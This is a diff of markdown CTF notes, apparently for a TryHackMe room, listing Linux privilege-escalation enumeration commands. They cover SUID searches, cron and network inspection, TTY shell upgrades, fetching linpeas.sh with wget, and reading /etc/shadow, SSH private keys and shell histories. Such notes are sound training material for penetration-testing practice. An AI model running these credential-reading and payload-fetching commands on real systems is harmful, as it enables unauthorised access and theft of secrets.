@@ -8,18 +8,159 @@ image: https://tryhackme-images.s3.amazonaws.com/room-icons/04afd126bf7a729eec5f
 
 # Privilege Escalation
 
+
 ````
 ------------------------------------------------
 - sudo -l
-- find / -perm -u=s -type f 2>/dev/null
-- cat /etc/crontab
 - uname -r 
 - python -m http.server 80 | wget http://IP/linpeas.sh
 - ps aux | ps -ef
 - cat /etc/passwd | cat /etc/shadow | cat /etc/group
 - cat ~/.bash_history
 - cat ~/.ssh/authorized_keys
-- python -c 'import pty;pty.spawn("/bin/bash")' | CTRL+Z | echo TERM$ | syyt -a | stty raw -echo | fg |
-
 -----------------------------------------------
 ````
+
+````
+Automated Scripts 
+
+linPEAS.sh
+LinEnum.sh
+linuxprivchecker.py
+unix-privesc-check
+metasploit: multi/recon/local_exploit_suggester
+````
+
+
+````
+Interactive Shell 
+
+python -c 'import pty;pty.spawn("/bin/bash");'  
+ctrl z  
+echo $TERM  
+stty -a  
+stty raw -echo  
+fg  
+
+export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH  
+export TERM=xterm256-color  
+export SHELL=bash  
+
+stty rows \<> colums \<> 
+````
+
+````
+Application Config Files 
+
+cat /etc/syslog.conf
+cat /etc/chttp.conf
+cat /etc/lighttpd.conf
+cat /etc/cups/cupsd.conf
+cat /etc/inetd.conf
+cat /etc/apache2/apache2.conf
+cat /etc/my.conf
+cat /etc/httpd/conf/httpd.conf
+cat /opt/lampp/etc/httpd.conf
+ls -aRl /etc/ | awk '$1 ~ /^.*r.*/
+````
+
+````
+Cronjobs
+
+crontab -l
+ls -alh /var/spool/cron
+ls -al /etc/ | grep cron
+ls -al /etc/cron*
+cat /etc/cron*
+cat /etc/at.allow
+cat /etc/at.deny
+cat /etc/cron.allow
+cat /etc/cron.deny
+cat /etc/crontab
+cat /etc/anacrontab
+cat /var/spool/cron/crontabs/root
+ls -al /var/cron.log - check timestamps 
+````
+
+````
+Network
+
+/sbin/ifconfig -a
+cat /etc/network/interfaces
+cat /etc/sysconfig/network
+ip a 
+ip addr
+
+cat /etc/resolv.conf
+cat /etc/sysconfig/network
+cat /etc/networks
+iptables -L
+hostname
+dnsdomainname
+````
+
+````
+SUID Files
+
+find / -perm -1000 -type d 2>/dev/null   # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.  
+find / -perm -g=s -type f 2>/dev/null    # SGID (chmod 2000) - run as the group, not the user who started it.  
+find / -perm -u=s -type f 2>/dev/null    # SUID (chmod 4000) - run as the owner, not the user who started it.  
+
+find / -perm -g=s -o -perm -u=s -type f 2>/dev/null    # SGID or SUID < full search  
+for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null; done    # Looks in 'common' places: /bin, /sbin < quicker  
+
+-find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied)
+find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null  
+
+find / perm /u=s -user "User name that you are looking for" 2>/dev/null  
+````
+
+````
+İnfo
+
+id
+who
+w
+last
+cat /etc/passwd | cut -d: -f1    # List of users
+grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1}'   # List of super users
+awk -F: '($3 == "0") {print}' /etc/passwd   # List of super users
+cat /etc/sudoers
+sudo -l
+
+## Check for Sensitive info 
+cat /etc/passwd
+cat /etc/group
+cat /etc/shadow
+ls -alh /var/mail/
+ls -ahlR /root/
+ls -ahlR /home/
+
+cat /var/apache2/config.inc
+cat /var/lib/mysql/mysql/user.MYD
+cat /root/anaconda-ks.cfg
+
+cat ~/.bash_history
+cat ~/.nano_history
+cat ~/.atftp_history
+cat ~/.mysql_history
+cat ~/.php_history
+
+## SSH KEYS
+cat ~/.ssh/authorized_keys
+cat ~/.ssh/identity.pub
+cat ~/.ssh/identity
+cat ~/.ssh/id_rsa.pub
+cat ~/.ssh/id_rsa
+cat ~/.ssh/id_dsa.pub
+cat ~/.ssh/id_dsa
+cat /etc/ssh/ssh_config
+cat /etc/ssh/sshd_config
+cat /etc/ssh/ssh_host_dsa_key.pub
+cat /etc/ssh/ssh_host_dsa_key
+cat /etc/ssh/ssh_host_rsa_key.pub
+cat /etc/ssh/ssh_host_rsa_key
+cat /etc/ssh/ssh_host_key.pub
+cat /etc/ssh/ssh_host_key
+````
+
